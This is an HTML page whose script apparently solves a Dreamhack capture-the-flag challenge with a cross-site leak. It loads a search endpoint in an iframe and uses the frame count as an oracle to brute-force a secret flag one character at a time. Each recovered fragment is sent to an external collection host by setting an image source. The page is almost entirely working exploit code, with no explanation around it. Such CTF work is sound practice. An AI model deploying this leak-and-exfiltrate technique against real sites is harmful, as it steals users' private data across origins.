<head>
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
</head>
<body>
    <iframe id="iframe"></iframe>
    <img id="img">
    <script>
        async function req(url) {
            return await new Promise((resolve, reject) => {
                const iframe = document.getElementById("iframe");
                iframe.src = url;
                iframe.onload = () => { 
                    if (iframe.contentWindow.frames.length != 0)
                        return resolve();
                    else
                        return reject();
                };
            });
        }
        async function search(query) {
            try {
                await req(
                  `http://host3.dreamhack.games:17366/search?query=${query}`
                );
                return true;
            } catch (e) {
                return false;
            }
        }
        async function exploit() {
            let chars = "1234567890abcdef}"
            let secret = "DH{";
            while (!secret.includes("}")) {
                for (let c of chars) {
                    if (await search(secret + c)) {
                        secret += c;
                        console.log(secret);
                        img.src = `https://mlfceez.request.dreamhack.games/${secret}`;
                        break;
                    }
                }
            }
        }
        exploit();
    </script>
</body>
